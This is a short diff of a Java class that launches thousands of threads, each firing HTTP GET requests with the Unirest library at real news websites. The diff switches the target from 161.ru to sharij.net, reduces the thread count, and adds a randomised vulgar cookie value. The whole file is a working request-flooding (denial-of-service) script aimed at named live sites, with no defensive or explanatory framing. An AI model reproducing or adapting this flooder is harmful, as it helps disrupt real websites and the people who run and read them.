@@ -9,7 +9,7 @@ public class HeyBabe implements Runnable {
     }
 
     private static void extracted() {
-        for (int i = 0; i < 1000000; i++) {
+        for (int i = 0; i < 10000; i++) {
             final HeyBabe heyBabe = new HeyBabe();
             final Thread thread = new Thread(heyBabe);
 
@@ -18,9 +18,10 @@ public class HeyBabe implements Runnable {
     }
 
     public static void hey() throws UnirestException {
+        double v = Math.random() * 49 + 1;
         Unirest.setTimeouts(0, 0);
-        HttpResponse<String> response = Unirest.get("https://161.ru/")
-//                .header("Cookie", "jtnews_ab_24=A; jtnews_ab_29=A; jtnews_ab_55=B; ngs_uid=wxPcGmIaAs0639/9BytOAg==")
+        HttpResponse<String> response = Unirest.get("https://sharij.net/")
+                .header("Cookie", "pizda " + v)
                 .asString();
     }
 
